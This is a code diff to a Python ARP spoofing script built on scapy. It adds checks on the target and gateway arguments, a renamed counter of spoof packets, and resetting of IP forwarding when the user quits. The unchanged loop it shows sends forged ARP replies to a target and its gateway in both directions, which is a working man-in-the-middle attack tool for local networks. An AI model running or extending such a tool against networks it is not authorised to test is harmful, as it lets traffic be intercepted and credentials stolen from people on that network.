@@ -1,7 +1,4 @@
-# An ARP Spoofer Script powered by Python 3.
-# Author: Gobinathan l
-# echo 1 > /proc/sys/net/ipv4/ip_forward
-# You don't need to run the Script again against the gateway to spoof as Target. The Script does that automatically.
+#echo 1 > /proc/sys/net/ipv4/ip_forward
 
 import scapy.all as scapy
 import time
@@ -22,8 +19,14 @@ def get_arguements():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t","--target", dest="target_ip", help="IP Address of Target Computer.")
     parser.add_argument("-g","--gateway", dest="spoof_ip", help="IP Address of Gateway.")
-    parser.add_argument("-f","--forward", dest="ip_forward", help="To disable The IP Forward Security Feature in Linux Machines.")
+    parser.add_argument("-f","--forward", dest="ip_forward", help="Disable IP Forward Restriction in Linux machines.")
     options = parser.parse_args()
+    if not options.target_ip:
+        parser.error(colored("[-] NO Target IP specified. Use -h or --help for more info.", "yellow"))
+    elif not options.spoof_ip:
+        parser.error("[-] NO Gateway IP specified. Use -h or --help for more info.")
+    elif not options.ip_forward:
+        parser.error("[-] NO IP Forward Option specified. Use -h or --help for more info.")
     return options
 
 def get_mac(ip):
@@ -56,11 +59,13 @@ def launch_attack(target_ip, spoof_ip, ip_forward):
         while True:
             spoof(target_ip , spoof_ip)
             spoof(spoof_ip, target_ip)
-            print("\r[+] Sent " + str(counter) + " Packets", end="")
+            print("\r[+] Sent " + str(counter) + " Spoof Packets", end="")
             counter += 2
             time.sleep(2)
     except KeyboardInterrupt:
         print(colored("\n[-] Ctrl+C detected, Quitting..", "yellow"))
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print(colored("[+] Restored IP Forward Rules.", "green"))
         restore(target_ip, spoof_ip)
         restore(spoof_ip, target_ip)
         print(colored("[+] Restored the ARP tables of Target and Host.", "green"))
